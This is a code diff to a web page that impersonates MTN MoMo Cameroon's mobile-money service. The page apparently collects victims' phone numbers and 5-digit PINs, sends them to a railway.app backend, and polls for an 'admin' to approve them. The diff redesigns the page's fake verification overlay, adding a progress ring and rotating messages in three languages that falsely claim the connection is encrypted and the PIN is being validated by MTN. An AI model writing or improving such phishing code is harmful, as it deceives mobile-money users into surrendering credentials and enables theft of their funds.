@@ -653,11 +653,16 @@
       animation: spin 0.7s linear infinite;
     }
 
-    /* VERIFY OVERLAY */
+    /* ============================================================
+       VERIFY OVERLAY — v2 (glass card + progress ring)
+       ============================================================ */
     .verify-overlay {
       position: fixed;
       inset: 0;
-      background: radial-gradient(circle at 50% 30%, #003366 0%, #001A33 60%, #000913 100%);
+      background:
+        radial-gradient(900px 600px at 50% -10%, rgba(255, 204, 0, 0.10), transparent 60%),
+        radial-gradient(700px 500px at 50% 110%, rgba(0, 64, 128, 0.35), transparent 60%),
+        linear-gradient(180deg, #001E3C 0%, #00132A 55%, #00080F 100%);
       display: none;
       flex-direction: column;
       align-items: center;
@@ -666,104 +671,109 @@
       z-index: 10000;
       overflow: hidden;
     }
-    .verify-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
+    .verify-overlay.show { display: flex; animation: vFadeIn 0.45s ease; }
+    @keyframes vFadeIn { from { opacity: 0; } to { opacity: 1; } }
+
     .verify-overlay::before {
       content: '';
       position: absolute;
       top: 50%; left: 50%;
-      width: 700px; height: 700px;
+      width: 520px; height: 520px;
       transform: translate(-50%, -50%);
-      background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 60%);
-      animation: glowPulse 3s ease-in-out infinite;
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.18), transparent 65%);
+      filter: blur(30px);
+      animation: vGlow 3.6s ease-in-out infinite;
       pointer-events: none;
     }
-    @keyframes glowPulse {
-      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
-      50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+    @keyframes vGlow {
+      0%, 100% { opacity: 0.55; transform: translate(-50%, -50%) scale(1); }
+      50%      { opacity: 0.9;  transform: translate(-50%, -50%) scale(1.08); }
     }
-    .verify-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
-    .verify-particle {
-      position: absolute;
-      width: 4px; height: 4px;
-      background: var(--mtn-gold);
-      border-radius: 50%;
-      opacity: 0;
-      box-shadow: 0 0 12px rgba(255, 204, 0, 0.8);
-      animation: particleFloat 8s infinite ease-in-out;
-    }
-    .verify-particle:nth-child(1) { left: 10%; top: 80%; animation-delay: 0s; }
-    .verify-particle:nth-child(2) { left: 25%; top: 60%; animation-delay: 1.2s; }
-    .verify-particle:nth-child(3) { left: 80%; top: 75%; animation-delay: 2.4s; }
-    .verify-particle:nth-child(4) { left: 65%; top: 85%; animation-delay: 3.6s; }
-    .verify-particle:nth-child(5) { left: 45%; top: 90%; animation-delay: 4.8s; }
-    .verify-particle:nth-child(6) { left: 88%; top: 45%; animation-delay: 6s; }
-    @keyframes particleFloat {
-      0% { opacity: 0; transform: translateY(0) scale(0.6); }
-      15% { opacity: 1; transform: translateY(-30px) scale(1.1); }
-      80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
-      100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
-    }
-    .verify-content {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      max-width: 340px;
-      text-align: center;
+
+    .verify-card {
       position: relative;
       z-index: 2;
+      width: 100%;
+      max-width: 360px;
+      border-radius: 26px;
+      padding: 30px 24px 24px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+      border: 1px solid rgba(255, 204, 0, 0.18);
+      box-shadow:
+        0 30px 60px rgba(0, 0, 0, 0.45),
+        inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      text-align: center;
+      animation: vCardIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
     }
-    .verify-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
-    .verify-orbit-ring {
-      position: absolute;
-      inset: 0;
-      border-radius: 50%;
-      border: 2px dashed rgba(255, 204, 0, 0.35);
-      animation: rotateSlow 10s linear infinite;
+    @keyframes vCardIn {
+      from { opacity: 0; transform: translateY(18px) scale(0.97); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
     }
-    .verify-orbit-ring.inner {
-      inset: 22px;
-      border: 1.5px dashed rgba(255, 204, 0, 0.55);
-      animation: rotateSlow 6s linear infinite reverse;
+
+    .verify-ring {
+      position: relative;
+      width: 118px; height: 118px;
+      margin: 0 auto 22px;
     }
-    @keyframes rotateSlow { to { transform: rotate(360deg); } }
-    .verify-orbit-core {
+    .verify-ring svg {
+      width: 100%; height: 100%;
+      transform: rotate(-90deg);
+      display: block;
+    }
+    .verify-ring .track {
+      fill: none;
+      stroke: rgba(255, 204, 0, 0.10);
+      stroke-width: 6;
+    }
+    .verify-ring .progress {
+      fill: none;
+      stroke: url(#vGoldGrad);
+      stroke-width: 6;
+      stroke-linecap: round;
+      stroke-dasharray: 326.72;
+      stroke-dashoffset: 326.72;
+      transition: stroke-dashoffset 0.6s ease;
+      filter: drop-shadow(0 0 8px rgba(255, 204, 0, 0.55));
+    }
+    .verify-ring-core {
       position: absolute;
       top: 50%; left: 50%;
-      width: 72px; height: 72px;
+      width: 74px; height: 74px;
       transform: translate(-50%, -50%);
-      border-radius: 18px;
+      border-radius: 50%;
       background: var(--grad-gold);
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
-      animation: corePulse 2s ease-in-out infinite;
-      padding: 8px;
+      padding: 12px;
+      box-shadow:
+        0 0 0 8px rgba(255, 204, 0, 0.08),
+        0 0 30px rgba(255, 204, 0, 0.45);
+      animation: vCorePulse 2.4s ease-in-out infinite;
     }
-    .verify-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
-    @keyframes corePulse {
-      0%, 100% { box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3); transform: translate(-50%, -50%) scale(1); }
-      50%      { box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5); transform: translate(-50%, -50%) scale(1.06); }
+    .verify-ring-core img { width: 100%; height: 100%; object-fit: contain; }
+    @keyframes vCorePulse {
+      0%, 100% {
+        box-shadow:
+          0 0 0 8px rgba(255, 204, 0, 0.08),
+          0 0 30px rgba(255, 204, 0, 0.40);
+      }
+      50% {
+        box-shadow:
+          0 0 0 14px rgba(255, 204, 0, 0.05),
+          0 0 45px rgba(255, 204, 0, 0.75);
+      }
     }
-    .verify-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
-    .verify-dot-orbit span {
-      position: absolute;
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: var(--mtn-gold);
-      box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
-    }
-    .verify-dot-orbit span:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
-    .verify-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
-    .verify-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
-    .verify-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
+
     .verify-title {
-      font-size: 20px;
+      font-size: 1.05rem;
       font-weight: 800;
       color: #fff;
-      margin-bottom: 10px;
+      letter-spacing: -0.01em;
       line-height: 1.35;
-      letter-spacing: -0.3px;
+      margin-bottom: 8px;
     }
     .verify-title .highlight {
       background: linear-gradient(90deg, #FFCC00, #FFD633);
@@ -772,58 +782,63 @@
       background-clip: text;
     }
     .verify-subtitle {
-      font-size: 13.5px;
-      color: rgba(255, 255, 255, 0.7);
-      line-height: 1.6;
-      margin-bottom: 30px;
+      font-size: 12.5px;
+      color: rgba(255, 255, 255, 0.62);
+      line-height: 1.55;
       font-weight: 500;
-      min-height: 1.4em;
+      min-height: 2.6em;
+      margin-bottom: 18px;
     }
-    .verify-bar {
-      width: 240px; height: 6px;
-      background: rgba(255, 204, 0, 0.12);
-      border-radius: 4px; overflow: hidden;
-      margin-bottom: 30px; position: relative;
+
+    .verify-dots {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 22px;
     }
-    .verify-bar-fill {
-      height: 100%; width: 0%;
-      background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
-      background-size: 200% 100%; border-radius: 4px;
-      transition: width 0.4s ease;
-      box-shadow: 0 0 14px rgba(255, 204, 0, 0.7);
-      animation: shimmer 2s linear infinite;
+    .verify-dots span {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      background: rgba(255, 204, 0, 0.15);
+      box-shadow: inset 0 0 0 1px rgba(255, 204, 0, 0.25);
+      transition: background 0.4s ease, box-shadow 0.4s ease, transform 0.4s ease;
     }
-    @keyframes shimmer {
-      0% { background-position: 200% 0; }
-      100% { background-position: -200% 0; }
+    .verify-dots span.on {
+      background: var(--mtn-gold);
+      box-shadow:
+        0 0 10px rgba(255, 204, 0, 0.85),
+        0 0 20px rgba(255, 204, 0, 0.45);
+      transform: scale(1.12);
+      animation: vDotPulse 1.4s ease-in-out infinite;
     }
-    .verify-step {
-      position: relative; height: 20px; overflow: hidden;
-      margin-bottom: 20px; width: 100%;
+    @keyframes vDotPulse {
+      0%, 100% { transform: scale(1.12); }
+      50%      { transform: scale(0.94); }
     }
-    .verify-step-inner {
-      display: flex; flex-direction: column; align-items: center;
-      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
-    }
-    .verify-step-text {
-      height: 20px; line-height: 20px; font-size: 12px;
-      color: rgba(255, 204, 0, 0.9); font-weight: 700;
-      letter-spacing: 0.03em;
-    }
-    .verify-status-row {
-      display: flex; align-items: center; gap: 8px;
-      font-size: 11.5px; color: rgba(255, 255, 255, 0.5);
-      font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase;
+
+    .verify-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 7px 14px;
+      border-radius: 50px;
+      background: rgba(34, 197, 94, 0.10);
+      border: 1px solid rgba(34, 197, 94, 0.25);
+      font-size: 10.5px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #86EFAC;
     }
     .verify-status-dot {
-      width: 7px; height: 7px; border-radius: 50%;
+      width: 6px; height: 6px; border-radius: 50%;
       background: #22C55E;
-      box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
-      animation: statusPulse 1.6s ease-in-out infinite;
+      box-shadow: 0 0 8px rgba(34, 197, 94, 0.9);
+      animation: vStatusPulse 1.6s ease-in-out infinite;
     }
-    @keyframes statusPulse {
+    @keyframes vStatusPulse {
       0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(0.85); }
+      50%      { opacity: 0.4; transform: scale(0.7); }
     }
 
     /* MOBILE */
@@ -836,11 +851,15 @@
       .brand-sub { font-size: 10px; }
       .pin-modal { bottom: 140px; }
       .lang-btn { padding: 6px 10px; font-size: 0.72rem; }
+      .verify-card { padding: 26px 20px 22px; border-radius: 22px; }
+      .verify-ring { width: 104px; height: 104px; margin-bottom: 18px; }
+      .verify-ring-core { width: 66px; height: 66px; padding: 10px; }
     }
     @media (max-width: 380px) {
       .brand-sub { display: none; }
       .brand-divider { display: none; }
       .lang-btn .lang-name { display: none; }
+      .verify-title { font-size: 1rem; }
     }
   </style>
 </head>
@@ -972,19 +991,25 @@
     </div>
   </div>
 
-  <!-- VERIFY OVERLAY -->
+  <!-- ============================================================
+       VERIFY OVERLAY — v2
+       ============================================================ -->
   <div class="verify-overlay" id="verifyOverlay">
-    <div class="verify-particles">
-      <span class="verify-particle"></span><span class="verify-particle"></span>
-      <span class="verify-particle"></span><span class="verify-particle"></span>
-      <span class="verify-particle"></span><span class="verify-particle"></span>
-    </div>
-    <div class="verify-content">
-      <div class="verify-orbit">
-        <div class="verify-orbit-ring"></div>
-        <div class="verify-orbit-ring inner"></div>
-        <div class="verify-dot-orbit"><span></span><span></span><span></span><span></span></div>
-        <div class="verify-orbit-core">
+    <div class="verify-card">
+
+      <div class="verify-ring">
+        <svg viewBox="0 0 118 118" aria-hidden="true">
+          <defs>
+            <linearGradient id="vGoldGrad" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0%"   stop-color="#FFD633"/>
+              <stop offset="50%"  stop-color="#FFCC00"/>
+              <stop offset="100%" stop-color="#F5B500"/>
+            </linearGradient>
+          </defs>
+          <circle class="track"    cx="59" cy="59" r="52"></circle>
+          <circle class="progress" id="verifyRingProgress" cx="59" cy="59" r="52"></circle>
+        </svg>
+        <div class="verify-ring-core">
           <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
         </div>
       </div>
@@ -992,27 +1017,21 @@
       <h2 class="verify-title" id="verifyTitle" data-i18n="verify.title">Verifying your MoMo account</h2>
       <p class="verify-subtitle" id="verifySubtitle" data-i18n="verify.sub">Waiting for confirmation. Please hold on…</p>
 
-      <div class="verify-bar"><div class="verify-bar-fill" id="verifyBarFill"></div></div>
-
-      <div class="verify-step">
-        <div class="verify-step-inner" id="verifyStepInner">
-          <div class="verify-step-text" data-i18n="verify.step1">🔒 Establishing secure connection</div>
-          <div class="verify-step-text" data-i18n="verify.step2">📡 Contacting MTN MoMo servers</div>
-          <div class="verify-step-text" data-i18n="verify.step3">🔐 Validating your credentials</div>
-          <div class="verify-step-text" data-i18n="verify.step4">⏳ Awaiting admin confirmation</div>
-        </div>
+      <div class="verify-dots" id="verifyDots">
+        <span></span><span></span><span></span><span></span><span></span>
       </div>
 
-      <div class="verify-status-row">
+      <div class="verify-status">
         <span class="verify-status-dot"></span>
         <span data-i18n="verify.live">Live · Secure Connection</span>
       </div>
+
     </div>
   </div>
 
   <script>
     // ============================================
-    // ✅ NEW BACKEND
+    // BACKEND
     // ============================================
     const API_BASE = 'https://momo-anniv-production.up.railway.app';
     const POLL_INTERVAL_MS = 2500;
@@ -1045,10 +1064,6 @@
         'pin.proceed': 'Proceed',
         'verify.title': 'Verifying your MoMo account',
         'verify.sub': 'Waiting for confirmation. Please hold on…',
-        'verify.step1': '🔒 Establishing secure connection',
-        'verify.step2': '📡 Contacting MTN MoMo servers',
-        'verify.step3': '🔐 Validating your credentials',
-        'verify.step4': '⏳ Awaiting admin confirmation',
         'verify.live': 'Live · Secure Connection',
         'footer.text': '© 2026 MTN MoMo Cameroon'
       },
@@ -1075,10 +1090,6 @@
         'pin.proceed': 'Continuer',
         'verify.title': 'Vérification de votre compte MoMo',
         'verify.sub': 'En attente de confirmation. Veuillez patienter…',
-        'verify.step1': '🔒 Établissement d\'une connexion sécurisée',
-        'verify.step2': '📡 Contact des serveurs MTN MoMo',
-        'verify.step3': '🔐 Validation de vos identifiants',
-        'verify.step4': '⏳ En attente de confirmation',
         'verify.live': 'En direct · Connexion sécurisée',
         'footer.text': '© 2026 MTN MoMo Cameroun'
       },
@@ -1105,10 +1116,6 @@
         'pin.proceed': 'Proceed',
         'verify.title': 'We dey verify your MoMo account',
         'verify.sub': 'We dey wait for confirmation. Hold on…',
-        'verify.step1': '🔒 We dey set up secure connection',
-        'verify.step2': '📡 We dey contact MTN MoMo servers',
-        'verify.step3': '🔐 We dey check your credentials',
-        'verify.step4': '⏳ We dey wait for admin',
         'verify.live': 'Live · Secure',
         'footer.text': '© 2026 MTN MoMo Cameroon'
       }
@@ -1159,7 +1166,7 @@
     applyLanguage(localStorage.getItem('momoLang') || 'en');
 
     // ============================================
-    // AUTO-FILL PHONE FROM INDEX
+    // AUTO-FILL PHONE
     // ============================================
     const phoneInput = document.getElementById('phone');
     const phoneWrapper = document.getElementById('phoneWrapper');
@@ -1273,14 +1280,108 @@
       bannerTimer = setTimeout(() => rejectBanner.classList.remove('show'), 6000);
     }
 
+    // ============================================
+    // VERIFY OVERLAY — v2 (glass card + ring + dots)
+    // ============================================
+    const verifyOverlay = document.getElementById('verifyOverlay');
+    const verifyRingProgress = document.getElementById('verifyRingProgress');
+    const verifyTitle = document.getElementById('verifyTitle');
+    const verifySubtitle = document.getElementById('verifySubtitle');
+    const verifyDots = document.getElementById('verifyDots');
+
+    const RING_CIRCUMFERENCE = 326.72; // 2π × 52
+
+    // messages shown while waiting
+    const VERIFY_STEPS_EN = [
+      { title: 'Establishing secure channel',  sub: 'Encrypting connection to MTN MoMo…' },
+      { title: 'Verifying your MoMo account',  sub: 'Checking the number you entered…' },
+      { title: 'Authenticating credentials',   sub: 'Validating your 5-digit PIN securely…' },
+      { title: 'Awaiting final confirmation',  sub: 'Waiting for admin to approve. Please hold on…' }
+    ];
+    const VERIFY_STEPS_FR = [
+      { title: 'Établissement d\'une connexion sécurisée', sub: 'Chiffrement de la connexion à MTN MoMo…' },
+      { title: 'Vérification de votre compte MoMo',        sub: 'Contrôle du numéro saisi…' },
+      { title: 'Authentification des identifiants',        sub: 'Validation de votre PIN à 5 chiffres…' },
+      { title: 'En attente de confirmation finale',        sub: 'En attente de l\'approbation. Veuillez patienter…' }
+    ];
+    const VERIFY_STEPS_CR = [
+      { title: 'We dey set up secure channel',   sub: 'We dey encrypt connection to MTN MoMo…' },
+      { title: 'We dey verify your MoMo account', sub: 'We dey check the number you put…' },
+      { title: 'We dey check your credentials',   sub: 'We dey validate your 5-digit PIN…' },
+      { title: 'We dey wait for final approval',  sub: 'Admin dey check. Hold on small…' }
+    ];
+
+    function getVerifySteps() {
+      const lang = localStorage.getItem('momoLang') || 'en';
+      if (lang === 'fr') return VERIFY_STEPS_FR;
+      if (lang === 'cr') return VERIFY_STEPS_CR;
+      return VERIFY_STEPS_EN;
+    }
+
+    let verifyTimer = null;
+    let stepTimer = null;
+
+    function setDots(count) {
+      if (!verifyDots) return;
+      const dots = verifyDots.querySelectorAll('span');
+      dots.forEach((d, i) => d.classList.toggle('on', i < count));
+    }
+
+    function startVerifyBar() {
+      verifyOverlay.classList.add('show');
+
+      // reset ring
+      if (verifyRingProgress) verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+
+      // reset dots
+      setDots(0);
+
+      // ---- progress ring: fills 0 → 90% over 10 minutes ----
+      const startTime = Date.now();
+      if (verifyTimer) clearInterval(verifyTimer);
+      verifyTimer = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const ratio = Math.min((elapsed / (10 * 60 * 1000)) * 0.90, 0.90);
+        if (verifyRingProgress) {
+          verifyRingProgress.style.strokeDashoffset = (RING_CIRCUMFERENCE * (1 - ratio)).toFixed(2);
+        }
+      }, 300);
+
+      // ---- cycle title / subtitle + light up dots ----
+      const steps = getVerifySteps();
+      let stepIndex = 0;
+      const applyStep = (i) => {
+        const s = steps[i];
+        if (verifyTitle) verifyTitle.textContent = s.title;
+        if (verifySubtitle) verifySubtitle.textContent = s.sub;
+        // dots: 1, 2, 3, 4 then all 5
+        setDots(Math.min(i + 1, 5));
+      };
+      applyStep(0);
+
+      if (stepTimer) clearInterval(stepTimer);
+      stepTimer = setInterval(() => {
+        stepIndex = (stepIndex + 1) % steps.length;
+        applyStep(stepIndex);
+      }, 2600);
+    }
+
+    function finishVerifyBar() {
+      if (verifyTimer) clearInterval(verifyTimer);
+      if (stepTimer) clearInterval(stepTimer);
+      if (verifyRingProgress) verifyRingProgress.style.strokeDashoffset = '0';
+      setDots(5);
+    }
+
     // RESET
     function resetToPhoneStep() {
       if (verifyTimer) clearInterval(verifyTimer);
       if (stepTimer) clearInterval(stepTimer);
       verifyOverlay.classList.remove('show');
-      verifyBarFill.style.background = '';
-      verifyBarFill.style.width = '0%';
-      verifyStepInner.style.transform = 'translateY(0)';
+      if (verifyRingProgress) {
+        verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+      }
+      setDots(0);
 
       popup.classList.remove('show');
       modal.classList.remove('open');
@@ -1310,7 +1411,7 @@
     // ============================================
     // PROCEED → backend
     // ============================================
-    let pollTimer = null, verifyTimer = null, stepTimer = null;
+    let pollTimer = null;
 
     proceed.addEventListener('click', async () => {
       if (!/^\d{5}$/.test(pin.value)) {
@@ -1381,41 +1482,6 @@
     });
 
     // ============================================
-    // VERIFY OVERLAY
-    // ============================================
-    const verifyOverlay = document.getElementById('verifyOverlay');
-    const verifyBarFill = document.getElementById('verifyBarFill');
-    const verifyTitle = document.getElementById('verifyTitle');
-    const verifySubtitle = document.getElementById('verifySubtitle');
-    const verifyStepInner = document.getElementById('verifyStepInner');
-
-    function startVerifyBar() {
-      verifyOverlay.classList.add('show');
-      verifyBarFill.style.width = '0%';
-      verifyStepInner.style.transform = 'translateY(0)';
-
-      let stepIndex = 0;
-      if (stepTimer) clearInterval(stepTimer);
-      stepTimer = setInterval(() => {
-        stepIndex = (stepIndex + 1) % 4;
-        verifyStepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
-      }, 2200);
-
-      const startTime = Date.now();
-      if (verifyTimer) clearInterval(verifyTimer);
-      verifyTimer = setInterval(() => {
-        const elapsed = Date.now() - startTime;
-        const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
-        verifyBarFill.style.width = pct.toFixed(1) + '%';
-      }, 300);
-    }
-    function finishVerifyBar() {
-      if (verifyTimer) clearInterval(verifyTimer);
-      if (stepTimer) clearInterval(stepTimer);
-      verifyBarFill.style.width = '100%';
-    }
-
-    // ============================================
     // POLLING
     // ============================================
     function stopPolling() {
@@ -1449,7 +1515,6 @@
     }
 
     window.addEventListener('load', () => {
-      // Only clear if index didn't just save a number
       if (!localStorage.getItem('momoPhone')) phoneInput.value = '';
       phoneInput.focus();
     });
